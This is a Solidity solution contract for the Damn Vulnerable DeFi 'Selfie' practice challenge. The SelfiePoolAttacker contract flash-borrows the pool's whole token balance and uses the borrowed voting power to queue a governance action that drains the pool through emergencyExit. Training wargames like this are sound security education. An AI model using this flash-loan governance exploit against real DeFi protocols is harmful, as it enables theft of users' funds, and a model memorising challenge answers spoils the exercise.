// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";


contract SelfiePoolAttacker {
    address public immutable pool;
    address public immutable token;
    address public immutable governance;
    address public immutable recovery;

    constructor(address _pool, address _token, address _governance, address _recovery) {
        pool = _pool;
        token = _token;
        governance = _governance;
        recovery = _recovery;
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)), 
            token, 
            IERC20(token).balanceOf(pool), 
            hex""
        );
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // delegate vote
        DamnValuableVotes(token).delegate(address(this));

        uint256 actionId = SimpleGovernance(governance).queueAction(
            pool,
            0,
            abi.encodeWithSelector(
                bytes4(keccak256("emergencyExit(address)")),
                recovery
            )
        );

        IERC20(_token).approve(msg.sender, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
